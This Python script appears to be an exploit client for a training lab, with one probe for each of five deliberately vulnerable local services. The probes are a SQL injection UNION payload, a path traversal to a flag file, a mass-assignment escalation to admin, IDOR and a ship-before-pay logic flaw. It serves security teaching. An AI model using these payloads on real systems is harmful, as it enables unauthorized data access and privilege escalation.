#!/usr/bin/env python3
"""Example clients for the five local lab flaws. Point only at your lab."""
import argparse
import json
import urllib.error
import urllib.parse
import urllib.request


def request(url: str, method: str = "GET", body: dict | None = None) -> tuple[int, dict]:
    payload = json.dumps(body).encode() if body is not None else None
    headers = {"Content-Type": "application/json", "X-User": "mallory"}
    req = urllib.request.Request(url, data=payload, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=3) as res:
            return res.status, json.loads(res.read() or b"{}")
    except urllib.error.HTTPError as exc:
        return exc.code, json.loads(exc.read() or b"{}")


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("service", choices=("notes", "workflow", "search", "go-files", "rust-profile"))
    p.add_argument("--base", required=True, help="URL of your own lab instance")
    p.add_argument("--id", type=int, help="object ID for notes/workflow")
    args = p.parse_args()
    base = args.base.rstrip("/")
    try:
        if args.service == "notes":
            code, data = request(f"{base}/api/notes/{args.id or 1}")
            print(json.dumps(data, indent=2))
            print(f"HTTP {code}: review owner/title/body; compare vulnerable and patched mode.")
        elif args.service == "workflow":
            if not args.id:
                _, orders = request(f"{base}/api/orders")
                args.id = next(o["id"] for o in orders["orders"] if o["item"] == "training-box")
            code, data = request(f"{base}/api/orders/{args.id}/ship", "POST", {})
            print(json.dumps(data, indent=2))
            print(f"HTTP {code}: vulnerable mode permits ship before pay; patched mode should return 409.")
        elif args.service == "search":
            probe = "%' UNION SELECT flag_id,flag FROM flags -- "
            url = f"{base}/api/search?q={urllib.parse.quote(probe, safe='')}"
            code, data = request(url)
            print(json.dumps(data, indent=2))
            print(f"HTTP {code}: in vulnerable mode the WHERE predicate is altered; patched mode treats this as data.")
        elif args.service == "go-files":
            traversal = "../private/blue/flag.txt"
            code, data = request(f"{base}/api/files/download?name={urllib.parse.quote(traversal, safe='')}" )
            print(json.dumps(data, indent=2))
            print(f"HTTP {code}: vulnerable mode reads outside public/; patched mode rejects traversal.")
        else:
            code, data = request(f"{base}/api/profile", "PUT", {"role": "admin"})
            print(json.dumps(data, indent=2))
            code2, secret = request(f"{base}/api/admin/secret")
            print(json.dumps(secret, indent=2))
            print(f"HTTP {code}/{code2}: vulnerable mode accepts mass assignment; patched mode keeps role member.")
    except Exception as exc:
        print(f"Request failed: {exc}")
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
